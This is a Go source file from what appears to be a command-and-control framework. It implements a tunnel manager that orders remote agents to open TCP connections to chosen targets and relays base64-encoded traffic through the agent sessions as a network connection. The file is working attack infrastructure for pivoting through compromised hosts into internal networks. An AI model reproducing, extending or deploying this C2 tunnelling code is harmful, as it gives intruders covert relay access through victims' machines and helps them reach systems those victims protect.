package c2

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
)

// TunnelManager handles bidirectional data tunnels through agent sessions.
type TunnelManager struct {
	tunnels map[string]*Tunnel
	mu      sync.RWMutex
}

// Tunnel represents an active TCP tunnel through an agent.
type Tunnel struct {
	ID      string
	Session *session.Session
	Target  string
	dataCh  chan []byte
	closeCh chan struct{}
	running atomic.Bool
	// chMu guards dataCh/closeCh so HandleTunnelResult can never send on
	// a channel that Close() is closing concurrently.
	chMu    sync.Mutex
	bytesRx uint64
	bytesTx uint64
}

// NewTunnelManager creates a tunnel manager.
func NewTunnelManager() *TunnelManager {
	return &TunnelManager{
		tunnels: make(map[string]*Tunnel),
	}
}

func newTunnelID() string {
	b := make([]byte, 8)
	if _, err := io.ReadFull(rand.Reader, b); err != nil {
		// Fallback that is still unique enough under concurrency.
		return fmt.Sprintf("tun-%x-%d", time.Now().UnixNano(), atomic.AddUint64(&tunnelSeq, 1))
	}
	return fmt.Sprintf("tun-%x", b)
}

var tunnelSeq uint64

// OpenTunnel sends a tunnel_open command to the agent and returns a net.Conn.
func (tm *TunnelManager) OpenTunnel(sess *session.Session, target string) (net.Conn, error) {
	id := newTunnelID()

	t := &Tunnel{
		ID:      id,
		Session: sess,
		Target:  target,
		dataCh:  make(chan []byte, 128),
		closeCh: make(chan struct{}),
	}
	t.running.Store(true)

	tm.mu.Lock()
	tm.tunnels[id] = t
	tm.mu.Unlock()

	cmd := fmt.Sprintf("tunnel_open:%s:%s", id, target)
	task := &proto.Task{
		TaskId:     "tun-open-" + id,
		Command:    cmd,
		TimeoutSec: 10,
	}

	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		tm.Close(id)
		return nil, fmt.Errorf("send tunnel open: %w", err)
	}

	return &tunnelConn{tunnel: t, tm: tm}, nil
}

// HandleTunnelResult processes an agent's tunnel-related response.
// Expected wire formats: "tunnel_data:<id>:<base64>" and "tunnel_err:<id>:<msg>".
// Routing uses the exact tunnel ID (parts[1]) instead of substring matching,
// which mis-routed data when one ID was a substring of another.
func (tm *TunnelManager) HandleTunnelResult(result *proto.TaskResult) {
	output := result.Output
	if output == "" {
		return
	}

	if !strings.HasPrefix(output, "tunnel_data:") && !strings.HasPrefix(output, "tunnel_err:") {
		return
	}

	parts := strings.SplitN(output, ":", 3)
	if len(parts) < 2 {
		return
	}
	id := parts[1]

	tm.mu.RLock()
	t, ok := tm.tunnels[id]
	tm.mu.RUnlock()
	if !ok {
		return
	}

	switch {
	case strings.HasPrefix(output, "tunnel_data:"):
		if len(parts) != 3 {
			return
		}
		data, err := base64.StdEncoding.DecodeString(parts[2])
		if err != nil || len(data) == 0 {
			return
		}
		log.Printf("[TUNNEL] Tunnel %s received %d bytes", t.ID, len(data))
		t.chMu.Lock()
		defer t.chMu.Unlock()
		if !t.running.Load() {
			return
		}
		select {
		case t.dataCh <- data:
		default:
			log.Printf("[TUNNEL] Tunnel %s dataCh full, dropping", t.ID)
		}

	case strings.HasPrefix(output, "tunnel_err:"):
		msg := ""
		if len(parts) == 3 {
			msg = parts[2]
		}
		log.Printf("[TUNNEL] Tunnel %s error from agent: %s", t.ID, msg)
		// Close() takes tm.mu.Lock — must be called OUTSIDE the RLock
		// above or the same goroutine deadlocks (RWMutex is not reentrant).
		tm.Close(t.ID)
	}
}

// SendData sends data from C2 to the agent through a tunnel.
func (tm *TunnelManager) SendData(tunnelID string, data []byte) error {
	tm.mu.RLock()
	t, ok := tm.tunnels[tunnelID]
	tm.mu.RUnlock()
	if !ok || !t.running.Load() {
		return fmt.Errorf("tunnel not found or closed")
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	cmd := fmt.Sprintf("tunnel_data:%s:%s", tunnelID, encoded)
	task := &proto.Task{
		TaskId:  "tun-data-" + tunnelID,
		Command: cmd,
	}
	return t.Session.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task)
}

// Close closes a tunnel (sends close to agent and cleans up).
func (tm *TunnelManager) Close(id string) {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	if ok {
		delete(tm.tunnels, id)
	}
	tm.mu.Unlock()

	if !ok {
		return
	}

	t.chMu.Lock()
	alreadyClosed := !t.running.CompareAndSwap(true, false)
	if !alreadyClosed {
		close(t.closeCh)
		close(t.dataCh)
	}
	t.chMu.Unlock()

	if alreadyClosed {
		return
	}

	// Send close to agent (the session may already be gone for orphaned tunnels)
	if t.Session != nil {
		cmd := fmt.Sprintf("tunnel_close:%s", id)
		task := &proto.Task{
			TaskId:  "tun-close-" + id,
			Command: cmd,
		}
		t.Session.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task)
	}
}

// --- tunnelConn implements net.Conn over C2 tunnel ---

type tunnelConn struct {
	tunnel  *Tunnel
	tm      *TunnelManager
	readBuf []byte
}

func (c *tunnelConn) Read(b []byte) (int, error) {
	if len(c.readBuf) > 0 {
		n := copy(b, c.readBuf)
		c.readBuf = c.readBuf[n:]
		return n, nil
	}

	select {
	case data, ok := <-c.tunnel.dataCh:
		if !ok {
			return 0, fmt.Errorf("tunnel closed")
		}
		n := copy(b, data)
		if n < len(data) {
			c.readBuf = data[n:]
		}
		return n, nil
	case <-c.tunnel.closeCh:
		return 0, fmt.Errorf("tunnel closed")
	}
}

func (c *tunnelConn) Write(b []byte) (int, error) {
	if !c.tunnel.running.Load() {
		return 0, fmt.Errorf("tunnel closed")
	}
	if err := c.tm.SendData(c.tunnel.ID, b); err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *tunnelConn) Close() error {
	c.tm.Close(c.tunnel.ID)
	return nil
}

func (c *tunnelConn) LocalAddr() net.Addr                { return addrAny("c2-tunnel") }
func (c *tunnelConn) RemoteAddr() net.Addr               { return addrAny(c.tunnel.Target) }
func (c *tunnelConn) SetDeadline(t time.Time) error      { return nil }
func (c *tunnelConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *tunnelConn) SetWriteDeadline(t time.Time) error { return nil }

type addrAny string

func (a addrAny) Network() string { return "tcp" }
func (a addrAny) String() string  { return string(a) }
